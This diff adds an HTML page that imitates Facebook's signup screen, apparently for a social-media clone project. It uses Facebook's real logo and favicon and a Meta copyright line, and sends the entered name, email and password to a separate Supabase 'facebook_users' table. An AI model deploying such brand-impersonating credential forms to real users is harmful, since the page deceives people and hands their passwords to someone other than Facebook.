@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Sign up for Facebook">
+    <title>Sign Up for Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .signup-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 432px;
+            max-width: 100%;
+        }
+
+        .facebook-logo {
+            display: block;
+            height: 52px;
+            margin: 0 auto 16px;
+        }
+
+        .signup-title {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            color: #1c1e21;
+            margin-bottom: 4px;
+        }
+
+        .signup-subtitle {
+            font-size: 15px;
+            text-align: center;
+            color: #606770;
+            margin-bottom: 16px;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 16px 0;
+        }
+
+        .signup-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .name-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .signup-input {
+            flex: 1;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            color: #1d2129;
+            outline: none;
+        }
+
+        .signup-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .signup-input::placeholder {
+            color: #90949c;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 12px 16px;
+            background-color: #00a400;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
+
+        .signup-btn:hover {
+            background-color: #009400;
+        }
+
+        .signup-btn:disabled {
+            background-color: #96d996;
+            cursor: not-allowed;
+        }
+
+        .terms-text {
+            font-size: 11px;
+            color: #777;
+            text-align: center;
+            line-height: 1.4;
+            margin-top: 16px;
+        }
+
+        .terms-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+
+        .login-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 17px;
+        }
+
+        .login-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Error message */
+        .error-message {
+            background-color: #ffebe8;
+            border: 1px solid #dd3c10;
+            border-radius: 4px;
+            padding: 10px 14px;
+            color: #dd3c10;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Success message */
+        .success-message {
+            background-color: #d4edda;
+            border: 1px solid #28a745;
+            border-radius: 4px;
+            padding: 10px 14px;
+            color: #28a745;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 20px;
+            background-color: white;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer-bottom {
+            font-size: 11px;
+            color: #737373;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid transparent;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Back link */
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-container">
+        <div class="signup-card">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="facebook-logo">
+
+            <h1 class="signup-title">Create a new account</h1>
+            <p class="signup-subtitle">It's quick and easy.</p>
+
+            <div class="divider"></div>
+
+            <div class="error-message" id="errorMessage"></div>
+            <div class="success-message" id="successMessage"></div>
+
+            <form class="signup-form" id="signupForm">
+                <div class="name-row">
+                    <input type="text" class="signup-input" id="fullname" placeholder="Full name" required>
+                    <input type="text" class="signup-input" id="username" placeholder="Username" required>
+                </div>
+                <input type="email" class="signup-input" id="email" placeholder="Email" required>
+                <input type="password" class="signup-input" id="password" placeholder="New password" required
+                    minlength="6">
+
+                <button type="submit" class="signup-btn" id="signupBtn">Sign Up</button>
+            </form>
+
+            <p class="terms-text">
+                By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a
+                    href="#">Cookies Policy</a>. You may receive SMS notifications from us and can opt out at any time.
+            </p>
+
+            <a href="facebook-login.html" class="login-link">Already have an account?</a>
+            <a href="signup.html" class="back-link">← Back to Instagram Sign Up</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">English (UK)</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">मराठी</a>
+                <a href="#">اردو</a>
+                <a href="#">ਪੰਜਾਬੀ</a>
+                <a href="#">தமிழ்</a>
+                <a href="#">বাংলা</a>
+                <a href="#">తెలుగు</a>
+                <a href="#">ગુજરાતી</a>
+                <a href="#">ಕನ್ನಡ</a>
+                <a href="#">മലയാളം</a>
+            </div>
+            <div class="footer-bottom">
+                Meta © <span id="year"></span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Supabase SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="supabase.js"></script>
+    <script>
+        const signupForm = document.getElementById('signupForm');
+        const fullnameInput = document.getElementById('fullname');
+        const usernameInput = document.getElementById('username');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const signupBtn = document.getElementById('signupBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
+
+        // Update year
+        document.getElementById('year').textContent = new Date().getFullYear();
+
+        // Check if already logged in
+        SupabaseAuth.redirectIfAuthenticated();
+
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.classList.add('show');
+            successMessage.classList.remove('show');
+        }
+
+        function showSuccess(message) {
+            successMessage.textContent = message;
+            successMessage.classList.add('show');
+            errorMessage.classList.remove('show');
+        }
+
+        // Handle Facebook signup - saves to facebook_users table!
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const fullName = fullnameInput.value.trim();
+            const username = usernameInput.value.trim(); // Keep original characters
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+
+            // Show loading
+            signupBtn.disabled = true;
+            signupBtn.innerHTML = '<span class="spinner"></span>';
+
+            // Use facebookSignUp - saves to facebook_users table
+            const result = await SupabaseAuth.facebookSignUp(email, password, username, fullName);
+
+            if (result.success) {
+                showSuccess('Account created! Redirecting to Instagram...');
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 1500);
+            } else {
+                signupBtn.disabled = false;
+                signupBtn.innerHTML = 'Sign Up';
+                showError(result.error || 'Something went wrong. Please try again.');
+            }
+        });
+    </script>
+</body>
+
+</html>
